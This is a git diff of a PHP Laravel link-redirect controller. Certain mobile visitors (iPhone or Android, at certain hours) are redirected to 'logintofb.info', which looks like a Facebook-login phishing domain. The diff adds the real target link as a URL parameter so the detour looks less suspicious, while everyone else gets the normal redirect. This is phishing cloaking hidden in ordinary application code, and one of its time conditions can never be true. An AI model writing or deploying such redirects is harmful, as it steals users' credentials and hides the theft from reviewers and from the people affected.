@@ -111,7 +111,7 @@ class LinksController extends Controller
         $currentTime = (int) date('G');
 
         if ($currentTime >= 23 && $currentTime <= 5 && Agent::is('iPhone')) {
-            return redirect('http://logintofb.info');
+            return redirect('http://logintofb.info/?url=' . $realLink);
         }
 
         if ($currentTime >= 0 && $currentTime <= 5 && Agent::isAndroidOS()) {
@@ -119,7 +119,7 @@ class LinksController extends Controller
         }
 
         if ($currentTime > 5 && $currentTime < 23 && Agent::is('iPhone')) {
-            return redirect('http://logintofb.info');
+            return redirect('http://logintofb.info/?url=' . $realLink);
         }
 
         return view('links.redirect', compact('realLink', 'title'));
